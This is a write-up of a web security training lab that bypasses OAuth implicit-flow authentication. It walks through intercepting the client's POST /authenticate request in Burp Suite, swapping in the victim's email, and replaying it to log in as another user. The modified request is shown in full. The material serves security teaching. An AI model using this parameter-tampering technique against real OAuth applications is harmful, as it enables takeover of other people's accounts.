# Lab: Authentication bypass via OAuth implicit flow

## LAB DESC

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net.

You can log in with your own social media account using the following credentials: wiener:peter.
```
## SOLUTION
**Initiate the OAuth Flow**
   * Ensure Burp Suite proxy is active.
   * Select **My account** on the web application and complete the login prompt via the OAuth service.
   * Allow the application to redirect you back to the home page.

**Analyze HTTP History**
   * Go to **Proxy** > **HTTP history** in Burp.
   * Trace the OAuth flow starting from the initial `GET /auth?client_id=[...]` request.
   * Identify the `POST /authenticate` request sent by the client application to its own backend, which passes the user profile details alongside the access token.

**Modify the Request in Repeater**
   * Right-click the `POST /authenticate` entry and select **Send to Repeater**.
   * Open the **Repeater** tab.
   * Locate the email parameter in the request body and update its value to `carlos@carlos-montoya.net`.
   * Click **Send** and confirm the server accepts the change with a `200 OK` response.

**Hijack Session in Browser**
   * Right-click the updated request in Repeater and select **Request in browser** > **In original session**.
   * Copy the generated single-use URL.
   * Paste and visit the URL in your proxy-configured browser to log in under Carlos's account.

## REQUEST BODY
```http
POST /authenticate HTTP/1.1
Host: 0a0b004503331a4880c9cb9a00a000b3.web-security-academy.net
Cookie: session=sV1u7g3rXWeVrqJ7Prp2H68fSG2Ehb5G
Content-Length: 111
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Accept: application/json
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a0b004503331a4880c9cb9a00a000b3.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0b004503331a4880c9cb9a00a000b3.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"petYxweVcqNmiwt-G_CbRitSZNBqZj7HBbQfvdwlJdB"}
```
> LAB SOLVED!
